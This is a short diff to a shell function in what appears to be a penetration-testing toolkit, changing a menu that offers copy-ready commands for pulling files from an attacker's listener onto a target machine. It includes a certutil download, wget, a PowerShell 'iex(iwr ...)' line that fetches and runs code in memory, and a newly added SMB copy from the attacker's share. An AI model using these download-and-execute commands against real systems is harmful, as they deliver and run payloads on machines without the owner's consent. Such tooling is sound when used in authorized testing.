@@ -51,8 +51,8 @@ nb-srv-file-download() {
     __ask "Choose a command to copy:"
     echo "1.  certutil -URLcache -f http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename"
     echo "2.  wget http://${__LHOST}:${__LPORT}/$filename -O $filename"
-    echo ""
-    echo "4.  iex(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/$filename)"
+    echo "3.  iex(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/$filename)"
+    echo "4.  copy \\${__LHOST}\share\\$filename"
     echo "5.  Previous menu"
     echo
     echo -n "Choice: "
@@ -61,8 +61,8 @@ nb-srv-file-download() {
     case $choice in
         1) __COMMAND="certutil -URLcache -split -f http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename";;
         2) __COMMAND="wget http://${__LHOST}:${__LPORT}/$filename -O $filename";;
-        3) __COMMAND="";;
-        4) __COMMAND="iex(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/$filename)";;
+        3) __COMMAND="iex(iwr -UseBasicParsing http://${__LHOST}:${__LPORT}/$filename)";;
+        4) __COMMAND="copy \\${__LHOST}\share\\$filename";;
         5) exit;;
         *) echo "Invalid option";;
     esac
